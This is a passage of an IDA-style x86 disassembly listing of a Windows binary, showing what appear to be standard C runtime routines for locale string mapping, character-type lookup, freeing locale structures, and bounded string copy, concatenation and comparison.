                mov     esi, ds:LCMapStringA
                push    ebx             ; cchDest
                push    ebx             ; lpDestStr
                push    [ebp+cbMultiByte] ; cchSrc
                push    eax             ; lpSrcStr
                push    [ebp+dwMapFlags] ; dwMapFlags
                push    [ebp+Locale]    ; Locale
                call    esi ; LCMapStringA
                mov     [ebp+cchWideChar], eax
                cmp     eax, ebx
                jnz     short loc_4190FE

loc_4190F7:                             ; CODE XREF: sub_418E45+2D3↓j
                                        ; sub_418E45+2FC↓j
                xor     esi, esi
                jmp     loc_4191B5
; ---------------------------------------------------------------------------

loc_4190FE:                             ; CODE XREF: sub_418E45+2B0↑j
                jle     short loc_41913D
                cmp     eax, 0FFFFFFE0h
                ja      short loc_41913D
                add     eax, 8
                cmp     eax, 400h
                ja      short loc_419125
                call    __alloca_probe_16
                mov     edi, esp
                cmp     edi, ebx
                jz      short loc_4190F7
                mov     dword ptr [edi], 0CCCCh
                add     edi, 8
                jmp     short loc_41913F
; ---------------------------------------------------------------------------

loc_419125:                             ; CODE XREF: sub_418E45+2C8↑j
                push    eax
                call    sub_40FE32
                pop     ecx
                cmp     eax, ebx
                jz      short loc_419139
                mov     dword ptr [eax], 0DDDDh
                add     eax, 8

loc_419139:                             ; CODE XREF: sub_418E45+2E9↑j
                mov     edi, eax
                jmp     short loc_41913F
; ---------------------------------------------------------------------------

loc_41913D:                             ; CODE XREF: sub_418E45:loc_4190FE↑j
                                        ; sub_418E45+2BE↑j
                xor     edi, edi

loc_41913F:                             ; CODE XREF: sub_418E45+2DE↑j
                                        ; sub_418E45+2F6↑j
                cmp     edi, ebx
                jz      short loc_4190F7
                push    [ebp+cchWideChar]
                push    ebx
                push    edi
                call    sub_413520
                add     esp, 0Ch
                push    [ebp+cchWideChar] ; cchDest
                push    edi             ; lpDestStr
                push    [ebp+cbMultiByte] ; cchSrc
                push    [ebp+lpWideCharStr] ; lpSrcStr
                push    [ebp+dwMapFlags] ; dwMapFlags
                push    [ebp+Locale]    ; Locale
                call    esi ; LCMapStringA
                mov     [ebp+cchWideChar], eax
                cmp     eax, ebx
                jnz     short loc_41916D
                xor     esi, esi
                jmp     short loc_419192
; ---------------------------------------------------------------------------

loc_41916D:                             ; CODE XREF: sub_418E45+322↑j
                push    [ebp+cchDest]   ; int
                lea     eax, [ebp+cchWideChar]
                push    [ebp+lpDestStr] ; int
                push    eax             ; int
                push    edi             ; int
                push    [ebp+CodePage]  ; UINT
                push    [ebp+var_14]    ; CodePage
                call    sub_41CA83
                mov     esi, eax
                mov     [ebp+lpMem], esi
                add     esp, 18h
                neg     esi
                sbb     esi, esi
                and     esi, [ebp+cchWideChar]

loc_419192:                             ; CODE XREF: sub_418E45+326↑j
                push    edi
                call    sub_418E25
                pop     ecx
                jmp     short loc_4191B5
; ---------------------------------------------------------------------------

loc_41919B:                             ; CODE XREF: sub_418E45+275↑j
                push    [ebp+cchDest]   ; cchDest
                push    [ebp+lpDestStr] ; lpDestStr
                push    [ebp+cbMultiByte] ; cchSrc
                push    [ebp+lpMultiByteStr] ; lpSrcStr
                push    [ebp+dwMapFlags] ; dwMapFlags
                push    [ebp+Locale]    ; Locale
                call    ds:LCMapStringA
                mov     esi, eax

loc_4191B5:                             ; CODE XREF: sub_418E45+2B4↑j
                                        ; sub_418E45+354↑j
                cmp     [ebp+lpWideCharStr], ebx
                jz      short loc_4191C3
                push    [ebp+lpWideCharStr] ; lpMem
                call    sub_40FD55
                pop     ecx

loc_4191C3:                             ; CODE XREF: sub_418E45+373↑j
                mov     eax, [ebp+lpMem]
                cmp     eax, ebx
                jz      short loc_4191D6
                cmp     [ebp+lpDestStr], eax
                jz      short loc_4191D6
                push    eax             ; lpMem
                call    sub_40FD55
                pop     ecx

loc_4191D6:                             ; CODE XREF: sub_418E45+383↑j
                                        ; sub_418E45+388↑j
                mov     eax, esi

loc_4191D8:                             ; CODE XREF: sub_418E45+235↑j
                                        ; sub_418E45+26D↑j
                lea     esp, [ebp-20h]
                pop     edi
                pop     esi
                pop     ebx
                mov     ecx, [ebp+var_4]
                xor     ecx, ebp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                leave
                retn
sub_418E45      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_4191EA(int, LCID Locale, DWORD dwMapFlags, LPCSTR lpMultiByteStr, int cbMultiByte, LPWSTR lpDestStr, int cchDest, UINT CodePage, int)
sub_4191EA      proc near               ; CODE XREF: sub_41178C+BC↑p
                                        ; sub_41178C+E1↑p ...

var_10          = byte ptr -10h
var_8           = dword ptr -8
var_4           = byte ptr -4
arg_0           = dword ptr  8
Locale          = dword ptr  0Ch
dwMapFlags      = dword ptr  10h
lpMultiByteStr  = dword ptr  14h
cbMultiByte     = dword ptr  18h
lpDestStr       = dword ptr  1Ch
cchDest         = dword ptr  20h
CodePage        = dword ptr  24h
arg_20          = dword ptr  28h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 10h
                push    [ebp+arg_0]
                lea     ecx, [ebp+var_10]
                call    sub_40E461
                push    [ebp+arg_20]    ; int
                lea     ecx, [ebp+var_10]
                push    [ebp+CodePage]  ; CodePage
                push    [ebp+cchDest]   ; cchDest
                push    [ebp+lpDestStr] ; lpDestStr
                push    [ebp+cbMultiByte] ; cbMultiByte
                push    [ebp+lpMultiByteStr] ; lpMultiByteStr
                push    [ebp+dwMapFlags] ; dwMapFlags
                push    [ebp+Locale]    ; Locale
                call    sub_418E45
                add     esp, 20h
                cmp     [ebp+var_4], 0
                jz      short locret_41922D
                mov     ecx, [ebp+var_8]
                and     dword ptr [ecx+70h], 0FFFFFFFDh

locret_41922D:                          ; CODE XREF: sub_4191EA+3A↑j
                leave
                retn
sub_4191EA      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_41922F(DWORD dwInfoType, LPCSTR lpMultiByteStr, int cbMultiByte, LPWORD lpCharType, UINT CodePage, LCID Locale, int)
sub_41922F      proc near               ; CODE XREF: sub_4193E9+2B↓p

CharType        = word ptr -8
var_4           = dword ptr -4
dwInfoType      = dword ptr  8
lpMultiByteStr  = dword ptr  0Ch
cbMultiByte     = dword ptr  10h
lpCharType      = dword ptr  14h
CodePage        = dword ptr  18h
Locale          = dword ptr  1Ch
arg_18          = dword ptr  20h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                push    ecx
                mov     eax, ___security_cookie
                xor     eax, ebp
                mov     [ebp+var_4], eax
                mov     eax, dword_42B438
                push    ebx
                push    esi
                xor     ebx, ebx
                push    edi
                mov     edi, ecx
                cmp     eax, ebx
                jnz     short loc_41928A
                lea     eax, [ebp+CharType]
                push    eax             ; lpCharType
                xor     esi, esi
                inc     esi
                push    esi             ; cchSrc
                push    offset SrcStr   ; lpSrcStr
                push    esi             ; dwInfoType
                call    ds:GetStringTypeW
                test    eax, eax
                jz      short loc_419270
                mov     dword_42B438, esi
                jmp     short loc_4192A4
; ---------------------------------------------------------------------------

loc_419270:                             ; CODE XREF: sub_41922F+37↑j
                call    ds:GetLastError
                cmp     eax, 78h
                jnz     short loc_419285
                push    2
                pop     eax
                mov     dword_42B438, eax
                jmp     short loc_41928A
; ---------------------------------------------------------------------------

loc_419285:                             ; CODE XREF: sub_41922F+4A↑j
                mov     eax, dword_42B438

loc_41928A:                             ; CODE XREF: sub_41922F+1F↑j
                                        ; sub_41922F+54↑j
                cmp     eax, 2
                jz      loc_419362
                cmp     eax, ebx
                jz      loc_419362
                cmp     eax, 1
                jnz     loc_41938C

loc_4192A4:                             ; CODE XREF: sub_41922F+3F↑j
                mov     dword ptr [ebp+CharType], ebx
                cmp     [ebp+CodePage], ebx
                jnz     short loc_4192B4
                mov     eax, [edi]
                mov     eax, [eax+4]
                mov     [ebp+CodePage], eax

loc_4192B4:                             ; CODE XREF: sub_41922F+7B↑j
                mov     esi, ds:MultiByteToWideChar
                xor     eax, eax
                cmp     [ebp+arg_18], ebx
                push    ebx             ; cchWideChar
                push    ebx             ; lpWideCharStr
                push    [ebp+cbMultiByte] ; cbMultiByte
                setnz   al
                push    [ebp+lpMultiByteStr] ; lpMultiByteStr
                lea     eax, ds:1[eax*8]
                push    eax             ; dwFlags
                push    [ebp+CodePage]  ; CodePage
                call    esi ; MultiByteToWideChar
                mov     edi, eax
                cmp     edi, ebx
                jz      loc_41938C
                jle     short loc_41931F
                cmp     edi, 7FFFFFF0h
                ja      short loc_41931F
                lea     eax, [edi+edi+8]
                cmp     eax, 400h
                ja      short loc_419309
                call    __alloca_probe_16
                mov     eax, esp
                cmp     eax, ebx
                jz      short loc_41931D
                mov     dword ptr [eax], 0CCCCh
                jmp     short loc_41931A
; ---------------------------------------------------------------------------

loc_419309:                             ; CODE XREF: sub_41922F+C5↑j
                push    eax
                call    sub_40FE32
                pop     ecx
                cmp     eax, ebx
                jz      short loc_41931D
                mov     dword ptr [eax], 0DDDDh

loc_41931A:                             ; CODE XREF: sub_41922F+D8↑j
                add     eax, 8

loc_41931D:                             ; CODE XREF: sub_41922F+D0↑j
                                        ; sub_41922F+E3↑j
                mov     ebx, eax

loc_41931F:                             ; CODE XREF: sub_41922F+B2↑j
                                        ; sub_41922F+BA↑j
                test    ebx, ebx
                jz      short loc_41938C
                lea     eax, [edi+edi]
                push    eax
                push    0
                push    ebx
                call    sub_413520
                add     esp, 0Ch
                push    edi             ; cchWideChar
                push    ebx             ; lpWideCharStr
                push    [ebp+cbMultiByte] ; cbMultiByte
                push    [ebp+lpMultiByteStr] ; lpMultiByteStr
                push    1               ; dwFlags
                push    [ebp+CodePage]  ; CodePage
                call    esi ; MultiByteToWideChar
                test    eax, eax
                jz      short loc_419356
                push    [ebp+lpCharType] ; lpCharType
                push    eax             ; cchSrc
                push    ebx             ; lpSrcStr
                push    [ebp+dwInfoType] ; dwInfoType
                call    ds:GetStringTypeW
                mov     dword ptr [ebp+CharType], eax

loc_419356:                             ; CODE XREF: sub_41922F+114↑j
                push    ebx
                call    sub_418E25
                mov     eax, dword ptr [ebp+CharType]
                pop     ecx
                jmp     short loc_4193D7
; ---------------------------------------------------------------------------

loc_419362:                             ; CODE XREF: sub_41922F+5E↑j
                                        ; sub_41922F+66↑j
                xor     esi, esi
                cmp     [ebp+Locale], ebx
                jnz     short loc_419371
                mov     eax, [edi]
                mov     eax, [eax+14h]
                mov     [ebp+Locale], eax

loc_419371:                             ; CODE XREF: sub_41922F+138↑j
                cmp     [ebp+CodePage], ebx
                jnz     short loc_41937E
                mov     eax, [edi]
                mov     eax, [eax+4]
                mov     [ebp+CodePage], eax

loc_41937E:                             ; CODE XREF: sub_41922F+145↑j
                push    [ebp+Locale]    ; Locale
                call    sub_41CA3A
                pop     ecx
                cmp     eax, 0FFFFFFFFh
                jnz     short loc_419390

loc_41938C:                             ; CODE XREF: sub_41922F+6F↑j
                                        ; sub_41922F+AC↑j ...
                xor     eax, eax
                jmp     short loc_4193D7
; ---------------------------------------------------------------------------

loc_419390:                             ; CODE XREF: sub_41922F+15B↑j
                cmp     eax, [ebp+CodePage]
                jz      short loc_4193B3
                push    ebx             ; int
                push    ebx             ; int
                lea     ecx, [ebp+cbMultiByte]
                push    ecx             ; int
                push    [ebp+lpMultiByteStr] ; int
                push    eax             ; UINT
                push    [ebp+CodePage]  ; CodePage
                call    sub_41CA83
                mov     esi, eax
                add     esp, 18h
                cmp     esi, ebx
                jz      short loc_41938C
                mov     [ebp+lpMultiByteStr], esi

loc_4193B3:                             ; CODE XREF: sub_41922F+164↑j
                push    [ebp+lpCharType] ; lpCharType
                push    [ebp+cbMultiByte] ; cchSrc
                push    [ebp+lpMultiByteStr] ; lpSrcStr
                push    [ebp+dwInfoType] ; dwInfoType
                push    [ebp+Locale]    ; Locale
                call    ds:GetStringTypeA
                mov     edi, eax
                cmp     esi, ebx
                jz      short loc_4193D5
                push    esi             ; lpMem
                call    sub_40FD55
                pop     ecx

loc_4193D5:                             ; CODE XREF: sub_41922F+19D↑j
                mov     eax, edi

loc_4193D7:                             ; CODE XREF: sub_41922F+131↑j
                                        ; sub_41922F+15F↑j
                lea     esp, [ebp-14h]
                pop     edi
                pop     esi
                pop     ebx
                mov     ecx, [ebp+var_4]
                xor     ecx, ebp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                leave
                retn
sub_41922F      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_4193E9(int, DWORD dwInfoType, LPCSTR lpMultiByteStr, int cbMultiByte, LPWORD lpCharType, UINT CodePage, LCID Locale, int)
sub_4193E9      proc near               ; CODE XREF: sub_41178C+9C↑p
                                        ; sub_413CA3+85↑p

var_10          = byte ptr -10h
var_8           = dword ptr -8
var_4           = byte ptr -4
arg_0           = dword ptr  8
dwInfoType      = dword ptr  0Ch
lpMultiByteStr  = dword ptr  10h
cbMultiByte     = dword ptr  14h
lpCharType      = dword ptr  18h
CodePage        = dword ptr  1Ch
Locale          = dword ptr  20h
arg_1C          = dword ptr  24h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 10h
                push    [ebp+arg_0]
                lea     ecx, [ebp+var_10]
                call    sub_40E461
                push    [ebp+arg_1C]    ; int
                lea     ecx, [ebp+var_10]
                push    [ebp+Locale]    ; Locale
                push    [ebp+CodePage]  ; CodePage
                push    [ebp+lpCharType] ; lpCharType
                push    [ebp+cbMultiByte] ; cbMultiByte
                push    [ebp+lpMultiByteStr] ; lpMultiByteStr
                push    [ebp+dwInfoType] ; dwInfoType
                call    sub_41922F
                add     esp, 1Ch
                cmp     [ebp+var_4], 0
                jz      short locret_419429
                mov     ecx, [ebp+var_8]
                and     dword ptr [ecx+70h], 0FFFFFFFDh

locret_419429:                          ; CODE XREF: sub_4193E9+37↑j
                leave
                retn
sub_4193E9      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41942B      proc near               ; CODE XREF: sub_411DDC+EC↑p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, [ebp+arg_0]
                test    esi, esi
                jz      loc_4195BD
                push    dword ptr [esi+4] ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+8] ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+0Ch] ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+10h] ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+14h] ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+18h] ; lpMem
                call    sub_40FD55
                push    dword ptr [esi] ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+20h] ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+24h] ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+28h] ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+2Ch] ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+30h] ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+34h] ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+1Ch] ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+38h] ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+3Ch] ; lpMem
                call    sub_40FD55
                add     esp, 40h
                push    dword ptr [esi+40h] ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+44h] ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+48h] ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+4Ch] ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+50h] ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+54h] ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+58h] ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+5Ch] ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+60h] ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+64h] ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+68h] ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+6Ch] ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+70h] ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+74h] ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+78h] ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+7Ch] ; lpMem
                call    sub_40FD55
                add     esp, 40h
                push    dword ptr [esi+80h] ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+84h] ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+88h] ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+8Ch] ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+90h] ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+94h] ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+98h] ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+9Ch] ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+0A0h] ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+0A4h] ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+0A8h] ; lpMem
                call    sub_40FD55
                add     esp, 2Ch

loc_4195BD:                             ; CODE XREF: sub_41942B+B↑j
                pop     esi
                pop     ebp
                retn
sub_41942B      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_4195C0      proc near               ; CODE XREF: sub_411DDC+67↑p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, [ebp+arg_0]
                test    esi, esi
                jz      short loc_419602
                mov     eax, [esi]
                cmp     eax, off_425ED8
                jz      short loc_4195DE
                push    eax             ; lpMem
                call    sub_40FD55
                pop     ecx

loc_4195DE:                             ; CODE XREF: sub_4195C0+15↑j
                mov     eax, [esi+4]
                cmp     eax, off_425EDC
                jz      short loc_4195F0
                push    eax             ; lpMem
                call    sub_40FD55
                pop     ecx

loc_4195F0:                             ; CODE XREF: sub_4195C0+27↑j
                mov     esi, [esi+8]
                cmp     esi, off_425EE0
                jz      short loc_419602
                push    esi             ; lpMem
                call    sub_40FD55
                pop     ecx

loc_419602:                             ; CODE XREF: sub_4195C0+B↑j
                                        ; sub_4195C0+39↑j
                pop     esi
                pop     ebp
                retn
sub_4195C0      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_419605      proc near               ; CODE XREF: sub_411DDC+46↑p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, [ebp+arg_0]
                test    esi, esi
                jz      short loc_419690
                mov     eax, [esi+0Ch]
                cmp     eax, off_425EE4
                jz      short loc_419624
                push    eax             ; lpMem
                call    sub_40FD55
                pop     ecx

loc_419624:                             ; CODE XREF: sub_419605+16↑j
                mov     eax, [esi+10h]
                cmp     eax, off_425EE8
                jz      short loc_419636
                push    eax             ; lpMem
                call    sub_40FD55
                pop     ecx

loc_419636:                             ; CODE XREF: sub_419605+28↑j
                mov     eax, [esi+14h]
                cmp     eax, off_425EEC
                jz      short loc_419648
                push    eax             ; lpMem
                call    sub_40FD55
                pop     ecx

loc_419648:                             ; CODE XREF: sub_419605+3A↑j
                mov     eax, [esi+18h]
                cmp     eax, off_425EF0
                jz      short loc_41965A
                push    eax             ; lpMem
                call    sub_40FD55
                pop     ecx

loc_41965A:                             ; CODE XREF: sub_419605+4C↑j
                mov     eax, [esi+1Ch]
                cmp     eax, off_425EF4
                jz      short loc_41966C
                push    eax             ; lpMem
                call    sub_40FD55
                pop     ecx

loc_41966C:                             ; CODE XREF: sub_419605+5E↑j
                mov     eax, [esi+20h]
                cmp     eax, off_425EF8
                jz      short loc_41967E
                push    eax             ; lpMem
                call    sub_40FD55
                pop     ecx

loc_41967E:                             ; CODE XREF: sub_419605+70↑j
                mov     esi, [esi+24h]
                cmp     esi, off_425EFC
                jz      short loc_419690
                push    esi             ; lpMem
                call    sub_40FD55
                pop     ecx

loc_419690:                             ; CODE XREF: sub_419605+B↑j
                                        ; sub_419605+82↑j
                pop     esi
                pop     ebp
                retn
sub_419605      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_419693      proc near               ; CODE XREF: sub_41740A+121↑p
                                        ; sub_41740A+146↑p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                push    ebx
                xor     ebx, ebx
                push    esi
                push    edi
                cmp     eax, ebx
                jz      short loc_4196AB
                mov     edi, [ebp+arg_4]
                cmp     edi, ebx
                ja      short loc_4196C6

loc_4196AB:                             ; CODE XREF: sub_419693+F↑j
                                        ; sub_419693+3C↓j
                call    sub_41090E
                push    16h
                pop     esi
                mov     [eax], esi

loc_4196B5:                             ; CODE XREF: sub_419693+6B↓j
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                call    sub_40EC54
                add     esp, 14h
                mov     eax, esi
                jmp     short loc_419702
; ---------------------------------------------------------------------------

loc_4196C6:                             ; CODE XREF: sub_419693+16↑j
                mov     esi, [ebp+arg_8]
                cmp     esi, ebx
                jnz     short loc_4196D1

loc_4196CD:                             ; CODE XREF: sub_419693+4A↓j
                mov     [eax], bl
                jmp     short loc_4196AB
; ---------------------------------------------------------------------------

loc_4196D1:                             ; CODE XREF: sub_419693+38↑j
                mov     edx, eax

loc_4196D3:                             ; CODE XREF: sub_419693+46↓j
                cmp     [edx], bl
                jz      short loc_4196DB
                inc     edx
                dec     edi
                jnz     short loc_4196D3

loc_4196DB:                             ; CODE XREF: sub_419693+42↑j
                cmp     edi, ebx
                jz      short loc_4196CD

loc_4196DF:                             ; CODE XREF: sub_419693+57↓j
                mov     cl, [esi]
                mov     [edx], cl
                inc     edx
                inc     esi
                cmp     cl, bl
                jz      short loc_4196EC
                dec     edi
                jnz     short loc_4196DF

loc_4196EC:                             ; CODE XREF: sub_419693+54↑j
                cmp     edi, ebx
                jnz     short loc_419700
                mov     [eax], bl
                call    sub_41090E
                push    22h
                pop     ecx
                mov     [eax], ecx
                mov     esi, ecx
                jmp     short loc_4196B5
; ---------------------------------------------------------------------------

loc_419700:                             ; CODE XREF: sub_419693+5B↑j
                xor     eax, eax

loc_419702:                             ; CODE XREF: sub_419693+31↑j
                pop     edi
                pop     esi
                pop     ebx
                pop     ebp
                retn
sub_419693      endp

; ---------------------------------------------------------------------------
                align 10h
                push    ebp
                mov     ebp, esp
                push    esi
                xor     eax, eax
                push    eax
                push    eax
                push    eax
                push    eax
                push    eax
                push    eax
                push    eax
                push    eax
                mov     edx, [ebp+0Ch]
                lea     ecx, [ecx+0]

loc_419724:                             ; CODE XREF: .text:00419731↓j
                mov     al, [edx]
                or      al, al
                jz      short loc_419733
                add     edx, 1
                bts     [esp], eax
                jmp     short loc_419724
; ---------------------------------------------------------------------------

loc_419733:                             ; CODE XREF: .text:00419728↑j
                mov     esi, [ebp+8]
                or      ecx, 0FFFFFFFFh
                lea     ecx, [ecx+0]

loc_41973C:                             ; CODE XREF: .text:0041974C↓j
                add     ecx, 1
                mov     al, [esi]
                or      al, al
                jz      short loc_41974E
                add     esi, 1
                bt      [esp], eax
                jnb     short loc_41973C

loc_41974E:                             ; CODE XREF: .text:00419743↑j
                mov     eax, ecx
                add     esp, 20h
                pop     esi
                leave
                retn

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_419756      proc near               ; CODE XREF: sub_41740A+FB↑p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ebx
                push    esi
                mov     esi, [ebp+arg_0]
                xor     ebx, ebx
                push    edi
                cmp     [ebp+arg_C], ebx
                jnz     short loc_419778
                cmp     esi, ebx
                jnz     short loc_41977C
                cmp     [ebp+arg_4], ebx
                jnz     short loc_419783

loc_419771:                             ; CODE XREF: sub_419756+4F↓j
                                        ; sub_419756+8E↓j
                xor     eax, eax

loc_419773:                             ; CODE XREF: sub_419756+46↓j
                                        ; sub_419756+A0↓j
                pop     edi
                pop     esi
                pop     ebx
                pop     ebp
                retn
; ---------------------------------------------------------------------------

loc_419778:                             ; CODE XREF: sub_419756+10↑j
                cmp     esi, ebx
                jz      short loc_419783

loc_41977C:                             ; CODE XREF: sub_419756+14↑j
                mov     edi, [ebp+arg_4]
                cmp     edi, ebx
                ja      short loc_41979E

loc_419783:                             ; CODE XREF: sub_419756+19↑j
                                        ; sub_419756+24↑j ...
                call    sub_41090E
                push    16h
                pop     esi
                mov     [eax], esi

loc_41978D:                             ; CODE XREF: sub_419756+B3↓j
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                call    sub_40EC54
                add     esp, 14h
                mov     eax, esi
                jmp     short loc_419773
; ---------------------------------------------------------------------------

loc_41979E:                             ; CODE XREF: sub_419756+2B↑j
                cmp     [ebp+arg_C], ebx
                jnz     short loc_4197A7
                mov     [esi], bl
                jmp     short loc_419771
; ---------------------------------------------------------------------------

loc_4197A7:                             ; CODE XREF: sub_419756+4B↑j
                mov     edx, [ebp+arg_8]
                cmp     edx, ebx
                jnz     short loc_4197B2
                mov     [esi], bl
                jmp     short loc_419783
; ---------------------------------------------------------------------------

loc_4197B2:                             ; CODE XREF: sub_419756+56↑j
                cmp     [ebp+arg_C], 0FFFFFFFFh
                mov     eax, esi
                jnz     short loc_4197C9

loc_4197BA:                             ; CODE XREF: sub_419756+6F↓j
                mov     cl, [edx]
                mov     [eax], cl
                inc     eax
                inc     edx
                cmp     cl, bl
                jz      short loc_4197E2
                dec     edi
                jnz     short loc_4197BA
                jmp     short loc_4197E2
; ---------------------------------------------------------------------------

loc_4197C9:                             ; CODE XREF: sub_419756+62↑j
                                        ; sub_419756+83↓j
                mov     cl, [edx]
                mov     [eax], cl
                inc     eax
                inc     edx
                cmp     cl, bl
                jz      short loc_4197DB
                dec     edi
                jz      short loc_4197DB
                dec     [ebp+arg_C]
                jnz     short loc_4197C9

loc_4197DB:                             ; CODE XREF: sub_419756+7B↑j
                                        ; sub_419756+7E↑j
                cmp     [ebp+arg_C], ebx
                jnz     short loc_4197E2
                mov     [eax], bl

loc_4197E2:                             ; CODE XREF: sub_419756+6C↑j
                                        ; sub_419756+71↑j ...
                cmp     edi, ebx
                jnz     short loc_419771
                cmp     [ebp+arg_C], 0FFFFFFFFh
                jnz     short loc_4197FB
                mov     eax, [ebp+arg_4]
                push    50h
                mov     [esi+eax-1], bl
                pop     eax
                jmp     loc_419773
; ---------------------------------------------------------------------------

loc_4197FB:                             ; CODE XREF: sub_419756+94↑j
                mov     [esi], bl
                call    sub_41090E
                push    22h
                pop     ecx
                mov     [eax], ecx
                mov     esi, ecx
                jmp     short loc_41978D
sub_419756      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41980B      proc near               ; CODE XREF: sub_41A8D6+34↓p

var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                and     [ebp+var_4], 0
                push    ebx
                mov     ebx, [ebp+arg_8]
                test    ebx, ebx
                jnz     short loc_419824
                xor     eax, eax
                jmp     loc_4198BE
; ---------------------------------------------------------------------------

loc_419824:                             ; CODE XREF: sub_41980B+10↑j
                push    edi
                cmp     ebx, 4
                jb      short loc_41989F
                lea     edi, [ebx-4]
                test    edi, edi
                jbe     short loc_41989F
                mov     ecx, [ebp+arg_4]
                mov     eax, [ebp+arg_0]

loc_419837:                             ; CODE XREF: sub_41980B+68↓j
                mov     dl, [eax]
                add     eax, 4
                add     ecx, 4
                test    dl, dl
                jz      short loc_419895
                cmp     dl, [ecx-4]
                jnz     short loc_419895
                mov     dl, [eax-3]
                test    dl, dl
                jz      short loc_41988B
                cmp     dl, [ecx-3]
                jnz     short loc_41988B
                mov     dl, [eax-2]
                test    dl, dl
                jz      short loc_419881
                cmp     dl, [ecx-2]
                jnz     short loc_419881
                mov     dl, [eax-1]
                test    dl, dl
                jz      short loc_419877
                cmp     dl, [ecx-1]
                jnz     short loc_419877
                add     [ebp+var_4], 4
                cmp     [ebp+var_4], edi
                jb      short loc_419837
                jmp     short loc_4198B6
; ---------------------------------------------------------------------------

loc_419877:                             ; CODE XREF: sub_41980B+5A↑j
                                        ; sub_41980B+5F↑j
                movzx   eax, byte ptr [eax-1]
                movzx   ecx, byte ptr [ecx-1]
                jmp     short loc_4198C7
; ---------------------------------------------------------------------------

loc_419881:                             ; CODE XREF: sub_41980B+4E↑j
                                        ; sub_41980B+53↑j
                movzx   eax, byte ptr [eax-2]
                movzx   ecx, byte ptr [ecx-2]
                jmp     short loc_4198C7
; ---------------------------------------------------------------------------

loc_41988B:                             ; CODE XREF: sub_41980B+42↑j
                                        ; sub_41980B+47↑j
                movzx   eax, byte ptr [eax-3]
                movzx   ecx, byte ptr [ecx-3]
                jmp     short loc_4198C7
; ---------------------------------------------------------------------------

loc_419895:                             ; CODE XREF: sub_41980B+36↑j
                                        ; sub_41980B+3B↑j
                movzx   eax, byte ptr [eax-4]
                movzx   ecx, byte ptr [ecx-4]
                jmp     short loc_4198C7
; ---------------------------------------------------------------------------

loc_41989F:                             ; CODE XREF: sub_41980B+1D↑j
                                        ; sub_41980B+24↑j
                mov     ecx, [ebp+arg_4]
                mov     eax, [ebp+arg_0]
                jmp     short loc_4198B6
; ---------------------------------------------------------------------------

loc_4198A7:                             ; CODE XREF: sub_41980B+AE↓j
                mov     dl, [eax]
                test    dl, dl
                jz      short loc_4198C1
                cmp     dl, [ecx]
                jnz     short loc_4198C1
                inc     eax
                inc     ecx
                inc     [ebp+var_4]

loc_4198B6:                             ; CODE XREF: sub_41980B+6A↑j
